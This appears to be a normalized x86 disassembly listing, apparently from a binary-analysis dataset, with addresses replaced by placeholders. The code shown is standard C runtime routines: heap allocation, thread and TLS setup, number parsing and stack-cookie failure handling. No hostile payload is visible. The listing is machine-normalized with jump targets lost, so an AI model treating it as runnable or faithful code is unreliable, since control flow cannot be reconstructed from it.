cmp [ rw-data ] eax
je r-xdata
push eax
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
pop ebx
pop ebp
retn
call sub_40aa97
mov [ eax ] esi
push ebx
call sub_40bf63
pop ecx
test eax eax
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
jmp r-xdata
call sub_40aa97
mov [ eax ] esi
sub_40aa55
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ecx * 8 + rw-data ]
pop ebp
retn
inc ecx
cmp ecx 0x2d
jb r-xdata
cmp eax [ ecx * 8 + rw-data ]
je r-xdata
lea ecx [ eax - 0x13 ]
cmp ecx 0x11
ja r-xdata
add eax 0xffffff44
push 0xe
pop ecx
cmp ecx eax
sbb eax eax
and eax ecx
add eax 0x8
pop ebp
retn
push 0xd
pop eax
pop ebp
retn
sub_40aabd
mov edi edi
push ebp
mov ebp esp
push esi
call sub_40aaaa
mov ecx [ ebp + 0x8 ]
push ecx
mov [ eax ] ecx
call sub_40aa55
pop ecx
mov esi eax
call sub_40aa97
mov [ eax ] esi
pop esi
pop ebp
retn
sub_40ab40
mov edi edi
push ebp
mov ebp esp
push esi
call sub_40b117
call sub_40b111
push eax
call sub_40b0f7
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x54 ]
mov [ eax + 0x54 ] edx
mov edx [ ecx + 0x58 ]
mov [ eax + 0x58 ] edx
mov edx [ ecx + 0x4 ]
push ecx
mov [ eax + 0x4 ] edx
call sub_40b2ec
mov esi [ ebp + 0x8 ]
push esi
call sub_40b111
push eax
call sub_40b14b
test eax eax
jne r-xdata
call [ GetCurrentThreadId@IAT ]
mov [ esi ] eax
jmp r-xdata
call [ GetLastError@IAT ]
push eax
call [ ExitThread@IAT ]
call sub_40aaff
sub_40aba5
mov edi edi
push ebp
mov ebp esp
push ebx
push edi
mov edi [ ebp + 0x10 ]
xor ebx ebx
test edi edi
jne r-xdata
push esi
call sub_40b117
push 0x214
push 0x1
call sub_40ca1d
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
call sub_40aa97
mov [ eax ] 0x16
call sub_40bf44
xor eax eax
jmp r-xdata
push esi
call sub_409fcc
pop ecx
test ebx ebx
je r-xdata
call sub_40b2d2
push [ eax + 0x6c ]
push esi
call sub_40b1a5
mov eax [ ebp + 0x14 ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi + 0x58 ] eax
mov eax [ ebp + 0x1c ]
pop ecx
pop ecx
mov [ esi + 0x54 ] edi
test eax eax
jne r-xdata
pop edi
pop ebx
pop ebp
retn
xor eax eax
push ebx
call sub_40aabd
pop ecx
push eax
push [ ebp + 0x18 ]
push esi
push sub_40ab40
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CreateThread@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp + 0x10 ]
pop esi
call [ GetLastError@IAT ]
mov ebx eax
sub_40ac45
push 0xc
push r--data
call sub_40c290
xor eax eax
xor esi esi
cmp [ ebp + 0x8 ] esi
setne al
cmp eax esi
jne r-xdata
call sub_40cab7
push 0x20
pop ebx
add eax ebx
push eax
push 0x1
call sub_40cbcf
pop ecx
pop ecx
mov [ ebp - 0x4 ] esi
call sub_40cab7
add eax ebx
push eax
call sub_40cc6c
pop ecx
mov edi eax
lea eax [ ebp + 0xc ]
push eax
push esi
push [ ebp + 0x8 ]
call sub_40cab7
add eax ebx
push eax
call sub_40cde3
mov [ ebp - 0x1c ] eax
call sub_40cab7
add eax ebx
push eax
push edi
call sub_40cd08
add esp 0x18
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40acd9
mov eax [ ebp - 0x1c ]
call sub_40aa97
mov [ eax ] 0x16
call sub_40bf44
or eax 0xffffffff
jmp r-xdata
call sub_40c2d5
retn
sub_40ad12
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_40ad02
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_40a0eb
pop ecx
sub_40ad33
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add ecx 0x9
push ecx
add eax 0x9
push eax
call sub_40da00
neg eax
pop ecx
sbb eax eax
pop ecx
inc eax
pop ebp
retn 0x4
sub_40ad7c
push 0x58
push r--data
call sub_40c290
lea eax [ ebp - 0x68 ]
push eax
call [ GetStartupInfoW@IAT ]
xor esi esi
cmp [ rw-data ] esi
jne r-xdata
mov eax 0x5a4d
cmp [ __dos_header ] ax
je r-xdata
push esi
push esi
push 0x1
push esi
call [ HeapSetInformation@IAT ]
mov eax [ r--data ]
cmp [ eax + __dos_header ] 0x4550
jne r-xdata
mov [ ebp - 0x1c ] esi
jmp r-xdata
mov ecx 0x10b
cmp [ eax + r--data ] cx
jne r-xdata
call sub_40b045
test eax eax
jne r-xdata
cmp [ eax + r--data ] 0xe
jbe r-xdata
call sub_40b489
test eax eax
jne r-xdata
push 0x1c
call sub_40ad53
xor ecx ecx
cmp [ eax + __coff_header ] esi
setne cl
mov [ ebp - 0x1c ] ecx
call sub_40c0c5
mov [ ebp - 0x4 ] esi
call sub_40deff
test eax eax
jns r-xdata
push 0x10
call sub_40ad53
call [ GetCommandLineA@IAT ]
mov [ rw-data ] eax
call sub_40de68
mov [ rw-data ] eax
call sub_40ddad
test eax eax
jns r-xdata
push 0x1b
call sub_40a3c3
call sub_40db37
test eax eax
jns r-xdata
push 0x8
call sub_40a3c3
push 0x1
call sub_40a1a2
pop ecx
cmp eax esi
je r-xdata
push 0x9
call sub_40a3c3
call sub_40dad8
test [ ebp - 0x3c ] 0x1
je r-xdata
push eax
call sub_40a3c3
push 0xa
pop ecx
movzx ecx [ ebp - 0x38 ]
jmp r-xdata
push ecx
push eax
push esi
push __dos_header
call sub_406070
sub_40aef3
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
push edi
push 0x8
pop ecx
mov esi r--data
lea edi [ ebp - 0x20 ]
[ edi ] [ esi ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
pop edi
mov [ ebp - 0x4 ] eax
pop esi
test eax eax
je r-xdata
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call [ RaiseException@IAT ]
leave
retn 0x8
test [ eax ] 0x8
je r-xdata
mov [ ebp - 0xc ] 0x1994000
sub_40af3f
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x320 ]
mov [ rw-data ] 0x10001
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov eax [ rw-data ]
mov [ ebp - 0x328 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x324 ] eax
call [ IsDebuggerPresent@IAT ]
mov [ rw-data ] eax
push 0x1
call sub_40e1df
pop ecx
push 0x0
call [ SetUnhandledExceptionFilter@IAT ]
push r--data
call [ UnhandledExceptionFilter@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
push 0xc0000409
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
leave
retn
push 0x1
call sub_40e1df
pop ecx
sub_40b063
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
imul ecx [ ebp + 0xc ]
push esi
mov esi ecx
test esi esi
jne r-xdata
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax [ ebp + 0xc ]
jae r-xdata
xor eax eax
cmp esi 0xffffffe0
ja r-xdata
inc esi
call sub_40aa97
mov [ eax ] 0xc
xor eax eax
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
je r-xdata
push esi
call sub_40bf63
pop ecx
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov [ ecx ] 0xc
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov [ eax ] 0xc
sub_40b117
mov edi edi
push esi
push [ rw-data ]
call [ TlsGetValue@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
retn
push [ rw-data ]
call [ DecodePointer@IAT ]
mov esi eax
push esi
push [ rw-data ]
call [ TlsSetValue@IAT ]
sub_40b168
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push eax
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
or [ rw-data ] 0xffffffff
jmp sub_40b99f
push eax
call [ TlsFree@IAT ]
or [ rw-data ] 0xffffffff
sub_40b1a5
push 0x8
push r--data
call sub_40c290
push r--data
call [ GetModuleHandleW@IAT ]
mov esi [ ebp + 0x8 ]
mov [ esi + 0x5c ] r--data
and [ esi + 0x8 ] 0x0
xor edi edi
inc edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x70 ] edi
mov [ esi + 0xc8 ] 0x43
mov [ esi + 0x14b ] 0x43
mov [ esi + 0x68 ] rw-data
push 0xd
call sub_40bacf
pop ecx
and [ ebp - 0x4 ] 0x0
push [ esi + 0x68 ]
call [ InterlockedIncrement@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40b247
push 0xc
call sub_40bacf
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0xc ]
mov [ esi + 0x6c ] eax
test eax eax
jne r-xdata
push [ esi + 0x6c ]
call sub_40e1e7
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40b250
call sub_40c2d5
retn
mov eax [ rw-data ]
mov [ esi + 0x6c ] eax
sub_40b259
mov edi edi
push esi
push edi
call [ GetLastError@IAT ]
push [ rw-data ]
mov edi eax
call sub_40b117
call eax
mov esi eax
test esi esi
jne r-xdata
push edi
call [ SetLastError@IAT ]
pop edi
mov eax esi
pop esi
retn
push 0x214
push 0x1
call sub_40ca1d
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
test eax eax
je r-xdata
push esi
call sub_409fcc
pop ecx
xor esi esi
push 0x0
push esi
call sub_40b1a5
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
sub_40b2ec
push 0x8
push r--data
call sub_40c290
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_40c2d5
retn 0x4
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
push eax
call sub_409fcc
pop ecx
mov eax [ esi + 0x34 ]
test eax eax
je r-xdata
push eax
call sub_409fcc
pop ecx
mov eax [ esi + 0x3c ]
test eax eax
je r-xdata
push eax
call sub_409fcc
pop ecx
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
push eax
call sub_409fcc
pop ecx
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
push eax
call sub_409fcc
pop ecx
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
push eax
call sub_409fcc
pop ecx
mov eax [ esi + 0x5c ]
cmp eax r--data
je r-xdata
push eax
call sub_409fcc
pop ecx
push 0xd
call sub_40bacf
pop ecx
and [ ebp - 0x4 ] 0x0
mov edi [ esi + 0x68 ]
test edi edi
je r-xdata
push eax
call sub_409fcc
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40b406
push 0xc
call sub_40bacf
pop ecx
mov [ ebp - 0x4 ] 0x1
mov edi [ esi + 0x6c ]
test edi edi
je r-xdata
push edi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40b412
push esi
call sub_409fcc
pop ecx
push edi
call sub_40e276
pop ecx
cmp edi [ rw-data ]
je r-xdata
cmp edi rw-data
je r-xdata
cmp edi rw-data
je r-xdata
push edi
call sub_409fcc
pop ecx
cmp [ edi ] 0x0
jne r-xdata
push edi
call sub_40e30f
pop ecx
sub_40b41b
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
pop ebp
retn
push 0x0
push eax
call [ TlsSetValue@IAT ]
push 0x0
push [ rw-data ]
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
push [ ebp + 0x8 ]
call sub_40b2ec
push esi
push [ rw-data ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
pop esi
push [ rw-data ]
push [ rw-data ]
call esi
call eax
mov [ ebp + 0x8 ] eax
sub_40b489
mov edi edi
push edi
push r--data
call [ GetModuleHandleW@IAT ]
mov edi eax
test edi edi
jne r-xdata
push esi
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
cmp [ rw-data ] 0x0
mov esi [ TlsSetValue@IAT ]
mov [ rw-data ] eax
je r-xdata
call sub_40b168
xor eax eax
pop edi
retn
mov eax [ TlsGetValue@IAT ]
mov [ rw-data ] eax
mov eax [ TlsFree@IAT ]
mov [ rw-data ] sub_40b0ee
mov [ rw-data ] esi
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push [ rw-data ]
push eax
call esi
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_40a14b
push [ rw-data ]
mov esi [ EncodePointer@IAT ]
call esi
push [ rw-data ]
mov [ rw-data ] eax
call esi
push [ rw-data ]
mov [ rw-data ] eax
call esi
push [ rw-data ]
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
call sub_40b955
test eax eax
je r-xdata
test eax eax
jne r-xdata
call sub_40b168
mov edi [ DecodePointer@IAT ]
push sub_40b2ec
push [ rw-data ]
call edi
call eax
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
call [ TlsAlloc@IAT ]
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
push 0x214
push 0x1
call sub_40ca1d
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call edi
call eax
test eax eax
je r-xdata
push 0x0
push esi
call sub_40b1a5
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
xor eax eax
inc eax
jmp r-xdata
pop esi
pop edi
retn
sub_40b610
push ebx
push esi
mov eax [ esp + 0x18 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0xc ]
div ecx
mov edx ebx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x18 ]
mov ecx eax
mov eax [ esp + 0x14 ]
mul esi
add edx ecx
jb r-xdata
pop esi
pop ebx
retn 0x10
dec esi
cmp edx [ esp + 0x10 ]
ja r-xdata
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_40b678
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi + 0xc ] 0x0
test eax eax
jne r-xdata
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
call sub_40b2d2
mov [ esi + 0x8 ] eax
mov ecx [ eax + 0x6c ]
mov [ esi ] ecx
mov ecx [ eax + 0x68 ]
mov [ esi + 0x4 ] ecx
mov ecx [ esi ]
cmp ecx [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
call sub_40e4a7
mov [ esi ] eax
mov eax esi
pop esi
pop ebp
retn 0x4
or [ eax + 0x70 ] 0x2
mov [ esi + 0xc ] 0x1
jmp r-xdata
call sub_40e743
mov [ esi + 0x4 ] eax
sub_40b6ff
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
push esi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x1c ]
call sub_40b678
mov eax [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
test eax eax
je r-xdata
test esi esi
jne r-xdata
mov [ eax ] esi
cmp [ ebp + 0x14 ] 0x0
je r-xdata
call sub_40aa97
mov [ eax ] 0x16
call sub_40bf44
cmp [ ebp - 0x10 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0x1c ]
push ebx
mov bl [ esi ]
push edi
lea edi [ esi + 0x1 ]
cmp [ ebp + 0x14 ] 0x2
jl r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
and [ eax + 0x70 ] 0xfffffffd
mov edx [ ecx + 0xc8 ]
movzx eax bl
movzx eax [ edx + eax * 2 ]
and eax 0x8
lea eax [ ebp - 0x1c ]
push eax
movzx eax bl
push 0x8
push eax
call sub_40ec04
mov ecx [ ebp - 0x1c ]
add esp 0xc
jmp r-xdata
cmp [ ebp + 0x14 ] 0x24
jg r-xdata
pop esi
leave
retn
cmp bl 0x2d
jne r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
test eax eax
je r-xdata
cmp bl 0x2b
jne r-xdata
or [ ebp + 0x18 ] 0x2
jmp r-xdata
cmp [ ecx + 0xac ] 0x1
jle r-xdata
mov eax [ ebp + 0x14 ]
test eax eax
js r-xdata
mov bl [ edi ]
inc edi
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
cmp eax 0x1
je r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov [ eax ] esi
cmp eax 0x24
jg r-xdata
xor eax eax
mov eax [ ebp - 0x14 ]
and [ eax + 0x70 ] 0xfffffffd
test eax eax
jne r-xdata
cmp eax 0x10
jne r-xdata
cmp bl 0x30
je r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x14 ]
mov esi [ ecx + 0xc8 ]
mov [ ebp - 0x8 ] edx
cmp bl 0x30
jne r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0xa
jmp r-xdata
and ecx 0x103
je r-xdata
movsx ecx bl
sub ecx 0x30
jmp r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0x10
jmp r-xdata
cmp al 0x58
je r-xdata
mov eax [ ebp + 0x18 ]
dec edi
test al 0x8
jne r-xdata
lea ecx [ ebx - 0x61 ]
cmp cl 0x19
movsx ecx bl
ja r-xdata
cmp ecx [ ebp + 0x14 ]
jae r-xdata
mov bl [ edi + 0x1 ]
add edi 0x2
cmp al 0x58
jne r-xdata
mov [ ebp + 0x14 ] 0x8
jmp r-xdata
mov esi 0x7fffffff
test al 0x4
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
add ecx 0xffffffc9
sub ecx 0x20
or [ ebp + 0x18 ] 0x8
cmp [ ebp - 0x4 ] eax
jb r-xdata
call sub_40aa97
test [ ebp + 0x18 ] 0x1
mov [ eax ] 0x22
je r-xdata
test al 0x1
jne r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov edi [ ebp + 0xc ]
mov edx [ ebp - 0x4 ]
imul edx [ ebp + 0x14 ]
add edx ecx
mov [ ebp - 0x4 ] edx
jne r-xdata
test [ ebp + 0x18 ] 0x2
push 0x0
pop eax
setne al
add eax esi
mov [ ebp - 0x4 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
and eax 0x2
je r-xdata
movzx ecx bl
movzx ecx [ esi + ecx * 2 ]
mov edx ecx
and edx 0x4
je r-xdata
or [ ebp + 0x18 ] 0x4
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp ecx [ ebp - 0x8 ]
jbe r-xdata
test [ ebp + 0x18 ] 0x2
je r-xdata
mov [ eax ] edi
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] 0x80000000
ja r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
neg [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] esi
jbe r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x14 ]
and [ eax + 0x70 ] 0xfffffffd
pop edi
pop ebx
sub_40b92a
mov edi edi
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
cmp [ rw-data ] eax
jne r-xdata
push eax
push rw-data
jmp r-xdata
call sub_40b6ff
add esp 0x14
pop ebp
retn
sub_40b955
mov edi edi
push esi
push edi
xor esi esi
mov edi rw-data
inc esi
cmp esi 0x24
jl r-xdata
lea eax [ esi * 8 + rw-data ]
mov [ eax ] edi
push 0xfa0
push [ eax ]
add edi 0x18
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
cmp [ esi * 8 + rw-data ] 0x1
jne r-xdata
xor eax eax
inc eax
and [ esi * 8 + rw-data ] 0x0
xor eax eax
jmp r-xdata
pop edi
pop esi
retn
sub_40b99f
mov edi edi
push ebx
mov ebx [ DeleteCriticalSection@IAT ]
push esi
mov esi rw-data
push edi
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
je r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
mov esi rw-data
pop edi
push edi
call ebx
push edi
call sub_409fcc
and [ esi ] 0x0
pop ecx
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call ebx
sub_40ba0d
push 0xc
push r--data
call sub_40c290
xor edi edi
inc edi
mov [ ebp - 0x1c ] edi
xor ebx ebx
cmp [ rw-data ] ebx
jne r-xdata
mov esi [ ebp + 0x8 ]
lea esi [ esi * 8 + rw-data ]
cmp [ esi ] ebx
je r-xdata
call sub_40c654
push 0x1e
call sub_40c4a5
push 0xff
call sub_40a121
push 0x18
call sub_40c9d8
pop ecx
mov edi eax
cmp edi ebx
jne r-xdata
mov eax edi
jmp r-xdata
push 0xa
call sub_40bacf
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi ] ebx
jne r-xdata
call sub_40aa97
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
call sub_40c2d5
retn
push edi
call sub_409fcc
pop ecx
push 0xfa0
push edi
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
jne r-xdata
mov [ esi ] edi
jmp r-xdata
push edi
call sub_409fcc
pop ecx
call sub_40aa97
mov [ eax ] 0xc
mov [ ebp - 0x1c ] ebx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40bac6
mov eax [ ebp - 0x1c ]
sub_40bacf
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
lea esi [ eax * 8 + rw-data ]
cmp [ esi ] 0x0
jne r-xdata
push [ esi ]
call [ EnterCriticalSection@IAT ]
pop esi
pop ebp
retn
push eax
call sub_40ba0d
pop ecx
test eax eax
jne r-xdata
push 0x11
call sub_40a3c3
sub_40bbb5
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ r--data ]
push esi
imul ecx ecx 0xc
add ecx [ ebp + 0x8 ]
pop esi
cmp eax ecx
jae r-xdata
mov esi ecx
imul esi esi 0xc
add esi [ ebp + 0x8 ]
add eax 0xc
cmp eax esi
jb r-xdata
xor eax eax
cmp [ eax + 0x4 ] edx
je r-xdata
cmp [ eax + 0x4 ] edx
je r-xdata
pop ebp
retn
sub_40bbf9
push 0x20
push r--data
call sub_40c290
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x28 ] edi
mov ebx [ ebp + 0x8 ]
cmp ebx 0xb
jg r-xdata
mov eax ebx
sub eax 0xf
je r-xdata
je r-xdata
mov esi rw-data
mov eax [ rw-data ]
sub eax 0x6
je r-xdata
call sub_40b259
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
jne r-xdata
mov eax ebx
push 0x2
pop ecx
sub eax ecx
je r-xdata
call sub_40c2d5
retn
cmp [ ebp - 0x20 ] eax
jne r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
dec eax
je r-xdata
push [ edi + 0x5c ]
mov edx ebx
call sub_40bbb5
pop ecx
lea esi [ eax + 0x8 ]
mov eax [ esi ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
sub eax ecx
je r-xdata
cmp [ ebp - 0x1c ] eax
je r-xdata
push 0x3
call sub_40a38f
mov [ ebp - 0x1c ] 0x1
push eax
call [ DecodePointer@IAT ]
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
call sub_40aa97
mov [ eax ] 0x16
call sub_40bf44
jmp r-xdata
mov [ ebp - 0x20 ] eax
xor eax eax
cmp [ ebp - 0x20 ] 0x1
je r-xdata
sub eax ecx
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
cmp ebx 0x8
je r-xdata
push eax
call sub_40bacf
pop ecx
sub eax ecx
jne r-xdata
mov ecx [ edi + 0x60 ]
mov [ ebp - 0x2c ] ecx
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
call sub_40b0e5
mov [ esi ] eax
mov ecx [ edi + 0x64 ]
mov [ ebp - 0x30 ] ecx
mov [ edi + 0x64 ] 0x8c
cmp ebx 0x4
jne r-xdata
push ebx
call [ ebp - 0x20 ]
push [ edi + 0x64 ]
push ebx
call [ ebp - 0x20 ]
pop ecx
jmp r-xdata
mov ecx [ r--data ]
mov [ ebp - 0x24 ] ecx
cmp ebx 0x8
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
pop ecx
cmp ebx 0x8
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40bd60
cmp ebx 0x8
jne r-xdata
mov ecx [ ebp - 0x24 ]
imul ecx ecx 0xc
mov edx [ edi + 0x5c ]
mov [ ecx + edx + 0x8 ] eax
inc [ ebp - 0x24 ]
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x30 ]
mov [ edi + 0x64 ] eax
cmp ebx 0x4
jne r-xdata
mov ecx [ r--data ]
add ecx [ r--data ]
cmp [ ebp - 0x24 ] ecx
jge r-xdata
sub_40bdc9
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x8 ]
push edi
cmp ebx 0xffffffff
je r-xdata
and [ ebp - 0x320 ] 0x0
push 0x4c
lea eax [ ebp - 0x31c ]
push 0x0
push eax
call sub_40f160
lea eax [ ebp - 0x320 ]
mov [ ebp - 0x328 ] eax
lea eax [ ebp - 0x2d0 ]
add esp 0xc
mov [ ebp - 0x324 ] eax
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov eax [ ebp + 0x4 ]
lea ecx [ ebp + 0x4 ]
mov [ ebp - 0x20c ] ecx
mov [ ebp - 0x2d0 ] 0x10001
mov [ ebp - 0x218 ] eax
mov ecx [ ecx - 0x4 ]
mov [ ebp - 0x21c ] ecx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x320 ] ecx
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x31c ] ecx
mov [ ebp - 0x314 ] eax
call [ IsDebuggerPresent@IAT ]
push 0x0
mov edi eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x328 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
test eax eax
jne r-xdata
push ebx
call sub_40e1df
pop ecx
mov ecx [ ebp - 0x4 ]
